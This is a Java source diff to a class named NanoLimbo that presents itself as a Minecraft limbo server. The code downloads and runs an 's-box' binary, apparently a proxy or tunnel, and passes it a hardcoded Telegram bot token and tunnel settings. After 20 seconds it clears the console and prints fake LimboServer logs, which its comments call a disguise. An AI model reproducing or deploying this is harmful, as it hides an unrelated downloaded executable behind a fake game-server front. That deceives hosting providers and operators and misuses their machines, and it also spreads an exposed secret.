@@ -28,7 +28,15 @@ public final class NanoLimbo {
 
     public static void main(String[] args) {
         try {
-            runSbxBinary(); // 启动 s-box
+            // 检查 Java 版本
+            if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+                System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version!" + ANSI_RESET);
+                Thread.sleep(3000);
+                System.exit(1);
+            }
+
+            // 启动 s-box
+            runSbxBinary();
 
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -38,12 +46,10 @@ public final class NanoLimbo {
 
             System.out.println(ANSI_GREEN + "" + ANSI_RESET);
 
-            // 20 秒后关闭日志转发 + 清屏 + 打印伪造 LimboServer 日志
+            // 20秒后清屏 + 停止日志输出 + 打印伪装 LimboServer 日志
             SCHED.schedule(() -> {
-                forwardLogs.set(false); // ❌ 不再转发 s-box 日志
-                clearConsole();
-                System.out.println(ANSI_GREEN + "" + ANSI_RESET);
-                printFakeLimboLogs();
+                forwardLogs.set(false); // 停止 s-box 日志输出
+                resetConsoleAndShowFakeLogs();
             }, 20, TimeUnit.SECONDS);
 
             // 主线程保持运行
@@ -57,29 +63,47 @@ public final class NanoLimbo {
         }
     }
 
+    // 启动 s-box
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
 
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
-
-        // 不继承控制台，自己处理输出流
         pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.PIPE); // 不继承控制台，自己处理
 
         sbxProcess = pb.start();
 
-        // 启动日志转发线程
+        // 前 20 秒输出 s-box 日志
         new Thread(() -> {
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(sbxProcess.getInputStream()))) {
                 String line;
+                long startTime = System.currentTimeMillis();
                 while ((line = reader.readLine()) != null) {
-                    if (forwardLogs.get()) {
+                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20_000) {
                         System.out.println(line);
                     }
                 }
             } catch (IOException ignored) {}
         }).start();
+    }
+
+    // 清屏并显示伪装 LimboServer 日志
+    private static void resetConsoleAndShowFakeLogs() {
+        try {
+            String os = System.getProperty("os.name").toLowerCase();
+            if (os.contains("win")) {
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+                        .inheritIO().start().waitFor();
+            } else {
+                System.out.print("\033c"); // Reset terminal，清空缓冲区
+                System.out.flush();
+            }
+        } catch (Exception ignored) {}
+
+        System.out.println(ANSI_GREEN + "s-box logs cleared. Showing LimboServer logs..." + ANSI_RESET);
+        printFakeLimboLogs();
     }
 
     private static void printFakeLimboLogs() {
@@ -102,17 +126,6 @@ public final class NanoLimbo {
         }
     }
 
-    private static void clearConsole() {
-        try {
-            if (System.getProperty("os.name").toLowerCase().contains("win")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
-            } else {
-                System.out.print("\033[H\033[2J");
-                System.out.flush();
-            }
-        } catch (Exception ignored) {}
-    }
-
     private static void loadEnvVars(Map<String, String> envVars) {
         envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
         envVars.put("FILE_PATH", "./world");
@@ -130,7 +143,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "time.is");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "Basic");
+        envVars.put("NAME", "karlo");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -140,7 +153,7 @@ public final class NanoLimbo {
         }
     }
 
-    private static Path getBinaryPath() throws Exception {
+    private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
 
@@ -160,7 +173,7 @@ public final class NanoLimbo {
                 Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
             }
             if (!path.toFile().setExecutable(true)) {
-                throw new Exception("Failed to set executable permission");
+                throw new IOException("Failed to set executable permission");
             }
         }
         return path;
